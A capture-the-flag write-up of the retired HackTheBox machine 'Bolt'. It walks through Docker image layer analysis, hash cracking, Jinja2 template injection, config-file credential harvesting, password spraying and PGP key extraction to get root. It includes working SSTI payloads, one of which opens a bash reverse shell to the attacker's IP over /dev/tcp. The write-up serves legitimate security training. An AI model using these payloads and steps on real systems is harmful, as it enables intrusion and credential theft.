# Bolt

This is the write-up for the box Bolt that got retired at the 19th February 2022.
My IP address was 10.10.14.2 while I did this.

Let's put this in our hosts file:
```markdown
10.10.11.114    bolt.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/bolt.nmap 10.10.11.114
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4d208ab2c28cf53ebed2e81816286e8e (RSA)
|   256 7b0ec75f5a4c7a117fdd585a172fcdea (ECDSA)
|_  256 a7224e45198e7d3cbcdf6e1d6c4f4156 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title:     Starter Website -  About
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2021-02-24T19:11:23
|_Not valid after:  2022-02-24T19:11:23
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Passbolt | Open source password manager for teams
|_Requested resource was /auth/login?redirect=%2F
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTPS (Port 443)

The web page on HTTPS shows a login field for [Passbolt](https://www.passbolt.com/) which is an open source password manager.

![Passbolt login](bolt_web-5.png)

## Checking HTTP (Port 80)

The web service advertises a company that offers several services.
The page on _/login_ shows a login form with the title _"Boilerplate Code Jinja"_:

![Login on Bolt](bolt_web-1.png)

When trying to register a user, it does not work and shows an _Internal Server Error_.

The page on _/download_ offers to download a **Docker image** in a _tar_ archive:
```
tar -xvf image.tar
```

To analyze the Docker image, the tool [dive](https://github.com/wagoodman/dive) can be used:
```
dive docker-archive://image.tar
```

Such an image has several layers and after analyzing the files, the web application is developed in Python and the _config.py_ may contain sensitive information.

Searching for all Python files:
```
for i in $(find . -name layer.tar); do echo $i; tar -tvf $i | grep .py$ | grep -v usr; done
```

Extracting the files from the layer with the _config.py_ file:
```
tar -C output/ -xvf ./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar
```

It shows the name of the **SQLite3** database, that can be found in another layer:
```
for i in $(find . -name layer.tar); do echo $i; tar -tvf $i | grep .sqlite3$ | grep -v usr; done
```
```
tar -C output/ -xvf ./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar
```

Accessing the database:
```
sqlite3 db.sqlite3
```

Dumping contents from the database:
```
sqlite> .tables
User

sqlite> SELECT * from User
   ...> ;
1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||
```

There is a username and a password hash that we can try to crack with **Hashcat**:
```
hashcat bolt_sqlite.hash /usr/share/wordlists/rockyou.txt
```

After a while the hash is cracked and the password of the user _admin_ can be used to access the _/login_ page:
> deadbolt

The login is successful and it forwards to a dashboard of [AdminLTE](https://adminlte.io/).

There is a chat between two users that mentions a security issue of the Docker image and talking about a demo environment:
```
Alexander Pierce:
Hi Sarah, did you have time to check over the docker image? If not I'll get Eddie to take a look over. Our security team had a concern with it - something about e-mail?

Sarah Bullock:
I have been so busy with the design I didn't have time yet, I think Eddie's help is required! Our demo is currently restricted to invite only.

Alexander Pierce:
Ok, I will get Eddie to take a look over. I just want to be sure that the Docker image is safe to use.

Sarah Bullock:
Not a problem, thanks for lending a hand! Make sure the image is scrubbed before hosting it!
```

### Enumerating Web Service

In the certificate of the HTTPS web service is the hostname _passbolt.bolt.htb_, that should be added to the _/etc/hosts_ file.
Because there is a subdomain, it is possible that there are more hostnames that can be searched with **Gobuster**:
```
gobuster vhost -k -u http://bolt.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

It finds _mail.bolt.htb_ and _demo.bolt.htb_, that have to be added to the _/etc/hosts_ file.
The _demo.bolt.htb_ environment looks like the default login page on _bolt.htb_, but when trying to create an account, there is another field that asks for an _Invite code_:

![Create account on demo](bolt_web-2.png)

To understand the functionality of this, the Docker image can be completely extracted to search for all relevant files.

Creating a list of all the layer names:
```
cat manifest.json | jq .[].Layers > layers.list
```

Extracting all files from the layers into another folder:
```
for i in $(cat layers.list); do tar -C output/ -xvf $i; done
```

The file _app/base/routes.py_ has the function of the _/register_ path, but there is no information about the invitation code.

Searching for other revisions of _routes.py_:
```
for i in $(find . -name layer.tar); do echo $i; tar -tvf $i | grep routes.py | grep -v usr; done
```
```
./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar
-rw-r--r-- root/root      3950 2021-03-05 15:27 app/base/routes.py

./2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tar
-rw-r--r-- root/root      3778 2021-03-05 18:49 app/base/routes.py
```

There are indeed two versions of the file, so lets look at the older one:
```
tar -C output2/ -xvf ./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar
```

There is a static invitation code, that can be used to create a user on _demo.bolt.htb_:
```python
# (...)
username  = request.form['username']
        email     = request.form['email'   ]
        code      = request.form['invite_code']
        if code != 'XNSS-HSJW-3NGU-8XTJ':
            return render_template('code-500.html')
# (...)            
```

### Exploiting Web Service

After login and looking on the profile, it is not possible to change any information because it says that email verification is required in order to update personal information:

![Changing profile information](bolt_web-3.png)

The user we created also has access on the [Roundcube](https://roundcube.net/) webmail service on _mail.bolt.htb_ and after changing the profile information, a mail is received.
When confirming the change, it will also confirm the name change and the **Server Side Template Injection (SSTI)** payload worked:

![SSTI confirmation](bolt_web-4.png)

I will use a code execution payload from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2):
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

The code execution payload worked and executed the `id` command, so this can be used to gain a reverse shell:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.2/9001 0>&1"').read() }}
```

After changing the name and confirming the change, it will execute the reverse shell command and the listener on my IP and port 9001 starts a shell as _www-data_.

## Privilege Escalation

In the file _/var/www/demo/config.py_ are credentials for a database:
```
SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail'
```

In the file _/var/www/roundcube/config/config.inc.php_ are credentials for the webmail service:
```
$config['db_dsnw'] = 'mysql://roundcubeuser:WXg5He2wHt4QYHuyGET@localhost/roundcube';
```

These databases don't have any interesting information, but the passwords may be useful, if some of them were reused.

According to the _/etc/nginx/sites-enabled/nginx-passbolt.conf_ file, the configuration files for the **Passbolt** service on port 443 are in _/etc/passbolt/_.
The file _passbolt_ contains credentials for the database:
```
'port' => '3306',
'username' => 'passbolt',
'password' => 'rT2;jW7<eY8!dX8}pQ8%',
'database' => 'passboltdb'
```

Enumerating the database:
```
mysql -u passbolt -p
```
```
mysql> show databases;
mysql> use passboltdb;
mysql> show tables;
mysql> select * from users
```

The table _users_ has the username for _eddie_ and _clark_, but not password hashes.
The table _secrets_ contains a **PGP** key that may be decrypted later:
```
mysql> describe secrets;
mysql> select user_id,data from secrets
```

We can try **Password Spraying** on all the found credentials of the users of the box:
```
crackmapexec ssh bolt.htb -u users.list -p passwords.list
```

The password for the **Passbolt** database is the same as for the user _eddie_ and it is possible to login via SSH:
```
ssh eddie@10.10.11.114
```

### Privilege Escalation to root

After login with _eddie_, the SSH banner shows that the user has mail, which can be found in _/var/spool/mail/eddie_:
```
Hey Eddie,

The password management server is up and running.
Go ahead and download the extension to your browser and get logged in.
Be sure to back up your private key because I CANNOT recover it.
Your private key is the only way to recover your account.
Once you're set up you can start importing your passwords.
Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...

-Clark
```

The browser configuration can be found in the users home directory in _.config/google-chrome_.
When searching for the PGP header, there are some results from JavaScript files and one binary file:
```
grep -R "BEGIN PGP PRIVATE KEY" .
```
```
Binary file ./Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches
```

Reading the strings and extracting the private PGP key:
```
strings "Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log"
```

When trying to import the private key of _eddie_, it asks for a password:
```
gpg --import eddie_pgp.priv
```

Extracting the hash of the private key and cracking it with **JohnTheRipper**:
```
gpg2john eddie_pgp.priv
```
```
john eddie_pgp.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

After a while, the password gets cracked and it is possible to import the key.
> merrychristmas

With this password, the **PGP message** from the database can be decrypted:
```
gpg -d passbolt.gpg
```
```
{"password":"Z(2rmxsNW(Z?3=p/9s","description":""}
```

This password can now be used with the commands `su -` to switch users to root!
